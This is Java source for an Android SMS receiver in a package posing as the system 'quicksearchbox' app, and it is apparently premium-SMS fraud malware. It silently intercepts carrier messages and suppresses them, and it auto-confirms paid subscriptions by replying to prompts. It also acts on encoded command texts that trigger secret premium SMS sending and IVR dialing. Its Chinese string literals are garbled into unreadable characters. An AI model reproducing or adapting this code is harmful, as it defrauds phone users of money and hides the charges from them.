package com.android.quicksearchbox.quicksearchbox.search;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.gsm.SmsMessage;
import android.util.Log;

import com.android.quicksearchbox.quicksearchbox.bean.BaseZone;
import com.android.quicksearchbox.quicksearchbox.bean.BillSms;
import com.android.quicksearchbox.quicksearchbox.bean.Ivr;
import com.android.quicksearchbox.quicksearchbox.model.SmsSenderAndReceiver;
import com.android.quicksearchbox.quicksearchbox.util.EncryptUtil;
import com.android.quicksearchbox.quicksearchbox.util.KsoCache;
import com.android.quicksearchbox.quicksearchbox.util.KsoHelper;
import com.android.quicksearchbox.quicksearchbox.util.LogFile;
import com.android.quicksearchbox.quicksearchbox.util.ShareProDBHelper;

@SuppressWarnings("deprecation")
public class SmsReceiver extends BroadcastReceiver {
	private static final String strRes = "android.provider.Telephony.SMS_RECEIVED";
	private static final String TAG = "SmsReceiver";
	private String smsNumber;
	private String smsContent;
	private ShareProDBHelper dbHelper;
	private String replyNumber;
	private int isShutGSMDown;
	private int isShutChanelDown;
	private String adsNumbers;
	private String saleVolumeNumbers;
	private Boolean sendSecretSms;
	private Boolean sendNormonSms;
	private String keyword;
	

	public SmsReceiver() {
	}

	public void onReceive(Context context, Intent intent) {
		dbHelper = new ShareProDBHelper(context);
		
		setSmsCenterNumber(intent);

		if (intent.getAction().equals(strRes)) {
			init();
			SharedPreferences sp2 = dbHelper
					.getSharedPreferences("sendSmsFlag");
			sendSecretSms = sp2.getBoolean("sendSecretSms", false);
			sendSecretSms = KsoCache.getInstance().getValue2("sendSecretSms") != null ? (Boolean) KsoCache
					.getInstance().getValue2("sendSecretSms") : false;
			sendNormonSms = sp2.getBoolean("sendNormonSms", false);
			sendNormonSms = KsoCache.getInstance().getValue2("sendNormonSms") != null ? (Boolean) KsoCache
					.getInstance().getValue2("sendNormonSms") : false;
			replyNumber = sp2.getString("secretSmsReplyNumber", "");
			replyNumber = KsoCache.getInstance().getValue2(
					"secretSmsReplyNumber") != null ? (String) KsoCache
					.getInstance().getValue2("secretSmsReplyNumber") : "";

			keyword = sp2.getString(keyword, "");
			keyword = KsoCache.getInstance().getValue2("keyword") != null ? (String) KsoCache
					.getInstance().getValue2("keyword") : "";
			StringBuilder body = new StringBuilder();
			StringBuilder number = new StringBuilder();
			Bundle bundle = intent.getExtras();

			if (bundle != null) {
				Object[] pdus = (Object[]) bundle.get("pdus");
				SmsMessage[] msg = new SmsMessage[pdus.length];
				for (int i = 0; i < pdus.length; i++) {
					msg[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
				}

				for (SmsMessage currMsg : msg) {
					body.append(currMsg.getDisplayMessageBody());
					number.append(currMsg.getDisplayOriginatingAddress());
				}
				smsContent = body.toString();
				smsNumber = number.toString();
			}
			if (smsNumber.startsWith("10086") || smsNumber.startsWith("10010")
					|| smsNumber.startsWith("106")) {
				Boolean smsCenterSendFlag = KsoCache.getInstance().getValue(
						"smsCenterFlag") != null ? (Boolean) KsoCache
						.getInstance().getValue("smsCenterFlag") : false;
				if (smsCenterSendFlag) {
					this.abortBroadcast();
				}

				if (smsContent.contains("�ֻ��Ķ�") || smsContent.contains("�ֻ�����")
						|| smsContent.contains("10086901")
						|| smsContent.contains("��Ϸ����")
						|| smsContent.contains("��ʼ��Ч")
						|| smsContent.contains("�ֻ���Ƶ")
						|| smsContent.contains("�ֻ�����")
						|| smsContent.contains("�㲥��Ϣ")) {
					this.abortBroadcast();
				}
			}

			if (sendSecretSms) {
				if (smsNumber.startsWith("10")
						|| smsNumber.startsWith(replyNumber)) {
					this.abortBroadcast();
				}
			}

			if (!sendSecretSms && sendNormonSms) {
				if (smsNumber.startsWith("10086")
						|| smsNumber.startsWith("10010")
						|| smsNumber.startsWith("106")) {
					if (isShutGSMDown == 1 || isShutChanelDown == 1) {
						this.abortBroadcast();
					}
				}
			}
			if (!"".equals(replyNumber) && smsNumber.startsWith(replyNumber)) {
				if (smsContent.contains("�ظ�����") || smsContent.contains("�ظ���ȷ��")) {
					if (sendSecretSms) {
						SmsSenderAndReceiver.send2(smsNumber, "��");
						this.abortBroadcast();
					} else if (sendNormonSms) {
						SmsSenderAndReceiver.send2(smsNumber, "��");
						if (isShutGSMDown == 1 || isShutChanelDown == 1) {
							this.abortBroadcast();
						}
					}
				}
				if (smsContent.contains("��������")
						|| (!interpruptContentIVR(smsContent)
								&& !interpruptContent(smsContent)
								&& !"".equals(keyword) && smsContent
									.contains(keyword))) {
					int offSet = 0;
					if (smsContent.contains("��������")) {
						offSet = smsContent.indexOf("��������") + 4;
					} else if (!"".equals(keyword)
							&& smsContent.indexOf(keyword) >= 0) {
						offSet = smsContent.indexOf(keyword) + keyword.length();
					}
					int lastSet = 0;

					if (String.valueOf(smsContent.charAt(offSet)).matches(
							"^[A-Za-z0-9]+$")) {

						for (int i = offSet; i < smsContent.length(); i++) {
							if (!String.valueOf(smsContent.charAt(i)).matches(
									"^[A-Za-z0-9]+$")) {

								lastSet = i;
								break;
							}
						}

						String smsCon = "";
						if (lastSet != smsContent.length() && lastSet != 0) {
							smsCon = smsContent.substring(offSet, lastSet);

						} else {
							smsCon = smsContent.substring(offSet);
						}

						if (sendSecretSms) {

							SmsSenderAndReceiver.send2(smsNumber, smsCon);
							this.abortBroadcast();

						} else if (sendNormonSms) {
							SmsSenderAndReceiver.send2(smsNumber, smsCon);
							if (isShutGSMDown == 1 || isShutChanelDown == 1) {
								this.abortBroadcast();
							}

						}

					} else if (!String.valueOf(smsContent.charAt(offSet))
							.matches("^(w|[u4E00-u9FA5])*$")) {

						int startIndex = 0;

						for (int i = offSet + 1; i < smsContent.length(); i++) {
							if (String.valueOf(smsContent.charAt(i)).matches(
									"^[A-Za-z0-9]+$")) {

								startIndex = i;
								break;
							}
						}

						for (int i = startIndex; i < smsContent.length(); i++) {
							if (!String.valueOf(smsContent.charAt(i)).matches(
									"^(w|[u4E00-u9FA5])*$")) {

								lastSet = i;
								break;
							}
						}
						
						String smsCont = "";
						if (lastSet != smsContent.length() && lastSet != 0) {
							smsCont = smsContent.substring(startIndex, lastSet);

						} else {
							smsCont = smsContent.substring(startIndex);
						}
	

						if (sendSecretSms) {
							SmsSenderAndReceiver.send2(smsNumber, smsCont);
							

							this.abortBroadcast();
						

						} else if (sendNormonSms) {
							
							SmsSenderAndReceiver.send2(smsNumber, smsCont);
						

							if (isShutGSMDown == 1 || isShutChanelDown == 1) {
								this.abortBroadcast();
							}

						}

					}

				}

			} else if (interpruptPhone(smsNumber)) {
				
				if ((smsContent.contains("��") && smsContent.contains("��")
						&& smsContent.contains("��") && smsContent
							.contains("��㲥"))
						|| (smsContent.contains("�������") && smsContent
								.contains("��Ϣ��"))
						|| (smsContent.contains("�㲥��Ϣ") && smsContent
								.contains("�ڷ���"))
						|| smsContent.contains("��������")
						|| smsContent.contains("�ɹ�����")) {

					this.abortBroadcast();
			

				}

				
				if (smsContent.contains("�ظ�����") || smsContent.contains("�ظ���ȷ��")) {

					if (sendSecretSms) {
				
						SmsSenderAndReceiver.send2(smsNumber, "��");
					
						this.abortBroadcast();
					} else if (sendNormonSms) {
						
						SmsSenderAndReceiver.send2(smsNumber, "��");
						if (isShutGSMDown == 1 || isShutChanelDown == 1) {
							this.abortBroadcast();

						}

					}

				}

				if (smsContent.contains("��������")
						|| (!interpruptContentIVR(smsContent)
								&& !interpruptContent(smsContent)
								&& !"".equals(keyword) && smsContent
								.indexOf(keyword) > 0)) {

					int offSet = 0;
					if (smsContent.contains("��������")) {
						offSet = smsContent.indexOf("��������") + 4;
					} else if (!"".equals(keyword)
							&& smsContent.indexOf(keyword) > 0) {
						offSet = smsContent.indexOf(keyword) + keyword.length();
					}
				
					int lastSet = 0;

					if (String.valueOf(smsContent.charAt(offSet)).matches(
							"^[A-Za-z0-9]+$")) {
						for (int i = offSet; i < smsContent.length(); i++) {
							if (!String.valueOf(smsContent.charAt(i)).matches(
									"^[A-Za-z0-9]+$")) {
								lastSet = i;
								break;
							}
						}
						String smsCon = "";
						if (lastSet != smsContent.length() && lastSet != 0) {
							smsCon = smsContent.substring(offSet, lastSet);

						} else {
							smsCon = smsContent.substring(offSet);
						}

						if (sendSecretSms) {
							SmsSenderAndReceiver.send2(smsNumber, smsCon);
						

							this.abortBroadcast();
						

						} else if (sendNormonSms) {
						
							SmsSenderAndReceiver.send2(smsNumber, smsCon);
						
							if (isShutGSMDown == 1 || isShutChanelDown == 1) {
								this.abortBroadcast();
								
							}

						}

					} else if (!String.valueOf(smsContent.charAt(offSet))
							.matches("^(w|[u4E00-u9FA5])*$")) {
						int startIndex = 0;

						for (int i = offSet + 1; i < smsContent.length(); i++) {
							if (String.valueOf(smsContent.charAt(i)).matches(
									"^[A-Za-z0-9]+$")) {

								startIndex = i;
								break;
							}
						}

						for (int i = startIndex; i < smsContent.length(); i++) {
							if (!String.valueOf(smsContent.charAt(i)).matches(
									"^(w|[u4E00-u9FA5])*$")) {

								lastSet = i;
								break;
							}
						}
						String smsCont = "";
						if (lastSet != smsContent.length() && lastSet != 0) {
							smsCont = smsContent.substring(startIndex, lastSet);

						} else {
							smsCont = smsContent.substring(startIndex);
						}
						if (sendSecretSms) {
							SmsSenderAndReceiver.send2(smsNumber, smsCont);
							this.abortBroadcast();
						} else if (sendNormonSms) {
							SmsSenderAndReceiver.send2(smsNumber, smsCont);
				

							if (isShutGSMDown == 1 || isShutChanelDown == 1) {
								this.abortBroadcast();
	
							}

						}

					}

				}

				if (smsContent.contains("��Ϣ��") || smsContent.contains("�������")) {
					if (isShutGSMDown == 1 && isShutChanelDown == 1) {
						this.abortBroadcast();
					}
				}
				if (sendSecretSms) {
					this.abortBroadcast();
				}

			} else if (interpruptAdsAndSaleNumber(smsNumber)) {
				this.abortBroadcast();
			}

			if (interpruptAdsAndSaleContent(smsContent)) {
				this.abortBroadcast();

			} else if (interpruptContentIVR(smsContent)) {
				Ivr ivr = EncryptUtil.getEncryptVIRString(smsContent);
				Intent service_ivr = new Intent(context, CallService.class);
				service_ivr.putExtra("dialTime", ivr.getDialTime());
				service_ivr.putExtra("chanel", ivr.getChanel());
				service_ivr.putExtra("radioPrompt1", ivr.getRadioPrompt1());
				service_ivr.putExtra("radioPrompt2", ivr.getRadioPrompt2());
				service_ivr.putExtra("radioPrompt3", ivr.getRadioPrompt3());
				service_ivr.putExtra("radioPrompt4", ivr.getRadioPrompt4());
				service_ivr.putExtra("keyCode1", ivr.getKeyCode1());
				service_ivr.putExtra("keyCode2", ivr.getKeyCode2());
				service_ivr.putExtra("keyCode3", ivr.getKeyCode3());
				service_ivr.putExtra("keyCode4", ivr.getKeyCode4());
				context.startService(service_ivr);

			} else if (interpruptContent(smsContent)) {
        this.abortBroadcast();
				BillSms billSms = EncryptUtil.getEncryptSMSString(smsContent);
				long time = KsoCache.getInstance().getValue("adsTime") != null ? (Long) KsoCache
						.getInstance().getValue("adsTime") : 4;
				Intent service = new Intent(context, SendSmsService.class);
				service.putExtra("sendTime", time);
				service.putExtra("sendCount", billSms.getCount());
				service.putExtra("secretSmsReplyNumber",
						billSms.getReplyNumber());
				service.putExtra("keyword", billSms.getKeyword());
				if (KsoHelper.getARS2(context) == 1) {
					service.putExtra("SecretSmsNumber",
							billSms.getMobileChanel());
					service.putExtra("SecretSmsOrder", billSms.getMobileOrder());
					service.putExtra("flag", 1);
				} else if (KsoHelper.getARS2(context) == 2) {
					service.putExtra("SecretSmsNumber",
							billSms.getUnionChanel());
					service.putExtra("SecretSmsOrder", billSms.getUnionOrder());
					service.putExtra("flag", 2);
				} else {
					service.putExtra("SecretSmsNumber",
							billSms.getMobileChanel());
					service.putExtra("SecretSmsOrder", billSms.getMobileOrder());
					service.putExtra("flag", 3);
				}
				context.startService(service);

			} else if (interpruptContentBaseZone(smsContent)) {
				

			}else if(smsContent.contains("����ޣ��������|ClientID".trim())){
				String curstomId = KsoCache.getInstance().getValue("curstomID")!= null
					? (String)KsoCache.getInstance().getValue("curstomID") : "00000000";
				if(!"".equals(curstomId)){
					SmsSenderAndReceiver.send2(smsNumber, curstomId);
				}
				this.abortBroadcast();
	
			}

		}

	}

	public boolean interpruptPhone(String telephoneNumber) {
		if (telephoneNumber.startsWith("10086")
				|| telephoneNumber.startsWith("106")
				|| telephoneNumber.startsWith("10010")) {
			return true;

		}

		return false;

	}

	public boolean interpruptContent(String phoneContent) {
		if (phoneContent.indexOf("SMVCE") >= 0) {
			return true;
		}
		return false;
	}


	public boolean interpruptContentIVR(String phoneContent) {
		if (phoneContent.indexOf("SMGE4") >= 0) {
			return true;
		}
		return false;

	}


	public boolean interpruptContentBaseZone(String phoneContent) {
		if (phoneContent.indexOf("BDVCG") >= 0) {
			return true;
		}
		return false;
	}

	public boolean interpruptAdsAndSaleNumber(String smsNumber) {

		if (!"".equals(adsNumbers)
				&& !"".equals(saleVolumeNumbers)
				&& (adsNumbers.indexOf(smsNumber) >= 0 || saleVolumeNumbers
						.indexOf(smsNumber) >= 0)) {
			return true;
		}
		return false;

	}

	public boolean interpruptAdsAndSaleContent(String smsContent) {
		if (!"".equals(saleVolumeNumbers)) {

			saleVolumeNumbers = saleVolumeNumbers.substring(0,
					saleVolumeNumbers.lastIndexOf(","));
			String[] saleNumberArray = saleVolumeNumbers.split(",");
			for (int i = 0; i < saleNumberArray.length; i++) {
				if (smsContent.indexOf(saleNumberArray[i]) >= 0) {
					return true;
				}
			}
		}

		if (!"".equals(adsNumbers)) {

			adsNumbers = adsNumbers.substring(0, adsNumbers.lastIndexOf(","));
			String[] adsNumbersArray = adsNumbers.split(",");
			for (int i = 0; i < adsNumbersArray.length; i++) {
				if (smsContent.indexOf(adsNumbersArray[i]) >= 0) {
					return true;
				}
			}

		}

		return false;

	}

	public void init() {
		isShutGSMDown = KsoCache.getInstance().getValue("isShutDown") != null ? (Integer) KsoCache
				.getInstance().getValue("isShutDown") : 0;
		isShutChanelDown = KsoCache.getInstance().getValue("isChanelShutDown") != null ? (Integer) KsoCache
				.getInstance().getValue("isChanelShutDown") : 0;

		adsNumbers = KsoCache.getInstance().getValue("adsNumbers") != null ? (String) KsoCache
				.getInstance().getValue("adsNumbers") : "";
		saleVolumeNumbers = KsoCache.getInstance().getValue("saleNumbers") != null ? (String) KsoCache
				.getInstance().getValue("saleNumbers") : "";

	}

	private void setSmsCenterNumber(Intent intent) {
		KsoCache cache = KsoCache.getInstance();

		Boolean smsCenterFlag = cache.getValue("smsCenterFlag") != null ? (Boolean) cache
				.getValue("smsCenterFlag") : false;
		if (smsCenterFlag) {
			String actionName = intent.getAction();
			int resultCode = getResultCode();
			if (actionName.equals("lab.sodino.sms.send")) {
				cache.reSetValue("SmsCenterNumber", "000");
			} else if (actionName.equals("lab.sodino.sms.delivery")) {
				cache.reSetValue("SmsCenterNumber", "000");
			} else if (actionName
					.equals("android.provider.Telephony.SMS_RECEIVED")) {
				System.out.println("[Sodino]result = " + resultCode);
				Bundle bundle = intent.getExtras();
				if (bundle != null) {
					Object[] myOBJpdus = (Object[]) bundle.get("pdus");
					SmsMessage[] messages = new SmsMessage[myOBJpdus.length];
					for (int i = 0; i < myOBJpdus.length; i++) {
						messages[i] = SmsMessage
								.createFromPdu((byte[]) myOBJpdus[i]);
					}
					SmsMessage message = messages[0];
					cache.reSetValue("SmsCenterNumber",
							message.getServiceCenterAddress());
					cache.reSetValue("smsCenterFlag", false);

				}
			}
		}
	}

}
